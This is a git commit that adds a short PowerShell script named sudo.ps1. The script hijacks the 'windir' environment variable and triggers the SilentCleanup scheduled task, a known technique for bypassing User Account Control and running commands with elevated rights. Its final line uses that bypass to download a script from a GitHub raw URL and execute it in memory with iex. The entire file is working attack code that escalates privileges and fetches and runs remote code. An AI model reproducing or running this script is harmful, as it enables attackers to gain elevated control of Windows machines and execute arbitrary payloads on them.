9446b6a235e3d33df25bc3f9e7ac2ff25df47aa0
eulersdisk <86271509+eulersdisk@users.noreply.github.com>
2021-07-06 00:15:10 -0300

    Add files via upload

---
+++ sudo.ps1
@@ -0,0 +1,9 @@
+function sudo {
+	$command = "powershell -noexit " + $args + ";#";
+
+  Set-ItemProperty -Path "HKCU:\Environment" -Name "windir" -Value $command ;
+  schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I;
+  Remove-ItemProperty -Path "HKCU:\Environment" -Name "windir"
+}
+
+sudo "powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/eulersdisk/system_security/main/script.ps1')"
